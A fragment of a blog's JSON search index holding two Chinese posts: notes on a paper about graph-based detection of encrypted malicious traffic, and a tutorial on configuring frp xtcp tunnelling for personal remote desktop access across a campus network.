将流分为短流和长流，并分别记录它们的相互作用模式，以降低图的密度。\n使用不同的地址作为顶点，分别连接与短流和长流关联的边。聚合大量相似的短流，为一组短流构建一条边，从而减少维护流交互模式的开销。拟合长流中数据包特征的分布，构建与长流相关的边缘，从而保证了高保真记录的流交互模式，同时解决了传统方法中粗粒度流特征的问题。\n预处理图 通过提取连通分量来减少图的开销，并使用高级统计信息进行聚类。其中，聚类可以准确地检测出只有良性交互模式的组件，从而对这些良性组件进行过滤，减小图的规模。此外，我们进行了预聚类，并使用生成的聚类中心来表示图像中的识别的集群的边缘。（第五节详细讲）\n基于图的恶意流量检测 通过分析图特征来实现无监督加密恶意流量检测。\n图构造 流的分类 为了避免图构建过程中流之间的依赖爆炸，把流分成长流和短流，并且降低密度。下图显示了显示了2020年1月MAWI互联网流量数据集的流完成时间和流长度的分布，纵轴PDF是概率密度函数，可以看到不论是长流还是短流都在分布短时间、长长度更多。 利用短流合并后，图的稠密度显著下降 获取每个数据包的信息，并获取其源、目标地址、端口号和每个数据包的功能，包括协议、长度和到达间隔。我们开发了一种流量分类算法来对流量进行分类（附录A中的算法1）简单来说就是维护一个哈希表，键是hash(src,dest,src_post,dest_port)，值是流的所有数据包特征的序列(协议、数据包长度、到达间隔)，然后用一个定时器TIME_NOW，每隔JUDGE_INTERVAL检查一下，如果在这个interval里流发了多个数据包，就算他是长流，否则就说他是短流）【q，这个interval怎么设置？为什么后面说ssh暴力破解都是短流？这不是应该是短期发好多包吗？】\n短流聚合 我们观察到，大多数短流具有几乎相同的每个数据包的特征序列。我们设计了一种聚合短流的算法（附录A中的算法2）。当满足以下所有要求时，可以聚合一组流\n流具有相同的源和/或目标地址（为啥不是哈希表的键值一样） 流具有相同的协议类型 流的数量足够大，即当短流量的数量达到阈值AGG_LINE 我们为短流构建一条边，为所有流及其四个元组保留一个特征序列（即协议、数据包长度和到达间隔）\n长流的特征分布拟合 由于长流中的特征是集中分布的，我们使用直方图来表示长流中每个数据包特征的频率分布。直方图的每个条目表示一个数据包特征的频率，从而避免保留其长的每个数据包特征序列。具体来说，我们为每个长流中的每个数据包特征序列构建直方图，然后维护一个哈希表， 键为数据包特征序列，值为直方图。我们将数据包长度和到达间隔的桶宽度分别设置为 10 字节和 1 毫秒，以在拟合精度和开销之间进行权衡。 下图显示了数据集中的长流中已用桶的数量和最大桶的大小，可以看是集中分布的，即长流中的大多数数据包具有相似的包长度和到达间隔。长度拟合平均用11个桶，每个桶平均200个数据包；到达间隔拟合平均用121个桶，每个桶平均71个数据包。 ","date":"2023-10-16T20:34:22+08:00","image":"http://localhost:1313/p/detecting-unknown-encrypted-malicious-traffic-in-real-time-via-flow-interaction-graph-analysis/pic/1698218520903_hu16157726159187679893.png","permalink":"http://localhost:1313/p/detecting-unknown-encrypted-malicious-traffic-in-real-time-via-flow-interaction-graph-analysis/","title":"Detecting Unknown Encrypted Malicious Traffic in Real Time via Flow Interaction Graph Analysis"},{"content":"导语 果壳的校园网不给直接内网连远程桌面，应该是因为vlan之间不能互相通信导致的，经典避免病毒在内网渗透。todesk自然是可以，但是感觉免费的todesk画质略输一筹的同时延迟也有点小高。于是想到用frp的内网穿透来搞p2p的远程桌面。\n操作 实际上还是挺简单的，为数不多的坑是网上的教程都还是ini格式，但是在现在的版本里已经转为了toml、yaml等，而且参数好像也有些变化。\n去github下载frp的releas\n服务端 在你的服务器上装frps，并且配置toml文件，下载的frps.toml已经基本上写好了，基本啥也不用改，只要把最后的插件注释掉（或者你也可以把插件装了用）\n1 2 3 4 5 6 7 8 9 10 11 #[[httpPlugins]] #name = \u0026#34;user-manager\u0026#34; #addr = \u0026#34;127.0.0.1:9000\u0026#34; #path = \u0026#34;/handler\u0026#34; #ops = [\u0026#34;Login\u0026#34;] #[[httpPlugins]] #name = \u0026#34;port-manager\u0026#34; #addr = \u0026#34;127.0.0.1:9001\u0026#34; #path = \u0026#34;/handler\u0026#34; #ops = [\u0026#34;NewProxy\u0026#34;] 再改一下auth.token，这个token是你的frpc也要配置成一样的，相当于server对client的认证。\n1 auth.token = \u0026#34;hsijdfhsjdhf\u0026#34; # 这个感觉可以随便写，多复杂都行，反正你能连上你的服务器就能查 然后再改一改web界面的用户名密码端口啥的或者直接把web也注释了\n1 2 3 4 webServer.addr = \u0026#34;0.0.0.0\u0026#34; webServer.port = 7500 webServer.user = \u0026#34;dgsdgfsdfs\u0026#34; webServer.password = \u0026#34;dweqweas\u0026#34; 然后启动时一定要用-c指定toml配置文件，否则我也不知道他默认找的哪里的配置文件\n客户端 这里使用了xtcp的代理协议来进行p2p的内网穿透，如果想用其他方法可以参考官方文档（？是吗）\n在被控端和控制端都装上对应平台的frpc，并且配置frpc.toml\n配置frps的地址端口和token\n1 2 3 serverAddr = \u0026#34;1.1.1.1\u0026#34; serverPort = 7000 auth.token = \u0026#34;asfggsaddasd\u0026#34; # 这里要和服务端配的一样 把下面哪些示例配置全都注释掉，然后写上下面的内容\n1 2 3 4 5 6 7 [[proxies]] name = \u0026#34;rdesk\u0026#34; type = \u0026#34;xtcp\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; # 本机 localPort = 3389 # 远程桌面连接 role = \u0026#34;server\u0026#34; secretKey = \u0026#34;akjndsghnkjadsfjh\u0026#34; 如果你的被控端的frpc设置开了web，那你应该可以再web界面看到你的xtcp的连接\n对了你还可以再你的frps和frpc里都指定一个user，这样你的proxy的name就会变成user.name的形式，这也就使你可以在server端配置多用户（指直接管name叫做aaa.xxx而不配置frps的user）\n同时在控制的机器那边也装上frpc，配置frps的地址端口和token\n1 2 3 serverAddr = \u0026#34;1.1.1.1\u0026#34; serverPort = 7000 auth.token = \u0026#34;asfggsaddasd\u0026#34; # 这里要和服务端配的一样 然后再加上\n1 2 3 4 5 6 7 [[visitors]] name = \u0026#34;rdesk_visitor\u0026#34; type = \u0026#34;xtcp\u0026#34; serverName = \u0026#34;rdesk\u0026#34; # 这里要和上面的name一致 secretKey = \u0026#34;akjndsghnkjadsfjh\u0026#34; # 这里要和上面的secretkey一致 bindAddr = \u0026#34;127.0.0.1\u0026#34; # 本机的ip地址 bindPort = 8000 然后使用frpc的同时也要用-c来指定配置文件\n./frpc.exe -c ./frpc.toml\nvisitors是在web里看不见的，看不到不要觉得奇怪。\n如果在server上可以看到都连上了，直接mstsc连就行了，连127.0.0.1:8000（也就是你在visitor里设置的地址端口）（这里是把log指向了console，所以可以直接看）\nwindwos防火墙会弹，同意了就完事了\n使用systemd让frps挂在后台 直接参考https://gofrp.org/zh-cn/docs/setup/systemd/\n","date":"2023-10-16T14:10:06+08:00","image":"http://localhost:1313/img/placeholder.jpeg","permalink":"http://localhost:1313/p/frp%E5%AE%9E%E7%8E%B0%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/","title":"Frp实现隧道穿透远程桌面"}]